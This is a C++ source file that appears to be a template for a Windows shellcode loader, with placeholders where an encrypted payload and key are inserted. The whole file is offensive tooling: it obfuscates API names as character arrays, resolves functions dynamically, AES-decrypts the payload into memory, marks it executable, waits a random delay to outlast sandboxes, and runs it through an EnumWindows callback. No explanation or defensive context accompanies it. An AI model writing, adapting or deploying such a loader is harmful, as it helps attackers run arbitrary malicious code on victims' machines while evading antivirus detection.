#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
using namespace std;

typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAlocationType, DWORD flProtect);
typedef FARPROC (WINAPI* pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI* pGetModuleHandle)(LPCSTR lpModuleName);
typedef VOID(WINAPI* pRtlMoveMemory)(VOID* destination, VOID* source, SIZE_T size);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef BOOL(WINAPI* pEnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam);
typedef HMODULE(WINAPI* pLoadLibrary)(LPCSTR lpLibFileName);
typedef BOOL(WINAPI* pCryptAcquireContextW)(HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(WINAPI* pCryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH* phHash);
typedef BOOL(WINAPI* pCryptHashData)(HCRYPTHASH hHash, const BYTE* pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL(WINAPI* pCryptDeriveKey)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY  *phKey);
typedef BOOL(WINAPI* pCryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL(WINAPI* pCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL(WINAPI* pCryptDestroyHash)(HCRYPTHASH hHash);
typedef VOID(WINAPI* pSleep)(DWORD dwMilliseconds);

BYTE payload_key[] = { <<<PAYLOADKEY>>> };
BYTE payload[] = { <<<PAYLOAD>>> };

unsigned char kernel32_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char ntdll_str[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
unsigned char user32_str[] = { 'u','s','e','r','3','2','.','d','l','l', 0x0 }; 
unsigned char advapi32_str[]  = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0x0 };
unsigned char virtualalloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 }; 
unsigned char getprocaddress_str[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 }; 
unsigned char getmodulehandleA_str[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
unsigned char rtlmovememory_str[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
unsigned char virtualprotect_str[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
unsigned char enumwindows_str[] = { 'E', 'n', 'u', 'm', 'W', 'i', 'n', 'd', 'o', 'w', 's', 0x00 };
unsigned char loadlibrary_str[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
unsigned char cryptacquirecontextw_str[] = { 'C', 'r', 'y', 'p', 't', 'A', 'c', 'q', 'u', 'i', 'r', 'e', 'C', 'o', 'n', 't', 'e', 'x', 't', 'W', 0x0 };
unsigned char cryptcreatehash_str[] = { 'C', 'r', 'y', 'p', 't', 'C', 'r', 'e', 'a', 't', 'e', 'H', 'a', 's', 'h', 0x0 }; 
unsigned char crypthashdata_str[] = { 'C', 'r', 'y', 'p', 't', 'H', 'a', 's', 'h', 'D', 'a', 't', 'a', 0x0 };
unsigned char cryptderivekey_str[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 'r', 'i', 'v', 'e', 'K', 'e', 'y', 0x0 };
unsigned char cryptdecrypt_str[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't', 0x0 };
unsigned char cryptreleasecontext_str[] = { 'C', 'r', 'y', 'p', 't', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x0 };
unsigned char cryptdestroyhash_str[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'H', 'a', 's', 'h', 0x0 };
unsigned char sleep_str[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };

pGetProcAddress cGetProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getprocaddress_str);
pGetModuleHandle cGetModuleHandle = (pGetModuleHandle)cGetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getmodulehandleA_str);

void AESDecrypt(BYTE* payload, DWORD payload_len, BYTE* key, size_t keylen)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	pCryptAcquireContextW cCryptAcquireContextW = (pCryptAcquireContextW)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptacquirecontextw_str);
	pCryptCreateHash cCryptCreateHash = (pCryptCreateHash) cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptcreatehash_str);
	pCryptHashData cCryptHashData = (pCryptHashData) cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)crypthashdata_str);
	pCryptDeriveKey cCryptDeriveKey = (pCryptDeriveKey) cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptderivekey_str);
	pCryptDecrypt cCryptDecrypt = (pCryptDecrypt) cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptdecrypt_str);
	pCryptReleaseContext cCryptReleaseContext = (pCryptReleaseContext) cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptreleasecontext_str);
	pCryptDestroyHash cCryptDestroyHash = (pCryptDestroyHash) cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptdestroyhash_str);

	cCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	cCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
	cCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
	cCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
	cCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);

	cCryptReleaseContext(hProv, 0);
	cCryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
}

int main()
{
    LPVOID exec_mem;
    DWORD oldprotect = 0;
	
	pVirtualAlloc cVirtualAlloc = (pVirtualAlloc)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)virtualalloc_str);

	exec_mem = cVirtualAlloc(0, (size_t)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	pRtlMoveMemory cRtlMoveMemory = (pRtlMoveMemory)cGetProcAddress(cGetModuleHandle((LPCSTR)ntdll_str), (LPCSTR)rtlmovememory_str);

	cRtlMoveMemory(exec_mem, payload, (size_t)sizeof(payload));

	AESDecrypt((LPBYTE)exec_mem, (size_t)sizeof(payload), payload_key, (size_t)sizeof(payload_key));

	pVirtualProtect cVirtualProtect = (pVirtualProtect)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)virtualprotect_str);
	cVirtualProtect(exec_mem, (size_t)sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

	pLoadLibrary cLoadLibrary = (pLoadLibrary)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)loadlibrary_str);
	cLoadLibrary((LPCSTR)user32_str);

	int sleep_time = rand() % 30000 + 30000;
	pSleep cSleep = (pSleep) cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)sleep_str);
	cSleep(sleep_time);

	pEnumWindows cEnumWindows = (pEnumWindows)cGetProcAddress(cGetModuleHandle((LPCSTR)user32_str), (LPCSTR)enumwindows_str);
	cEnumWindows((WNDENUMPROC)exec_mem, 0);
}
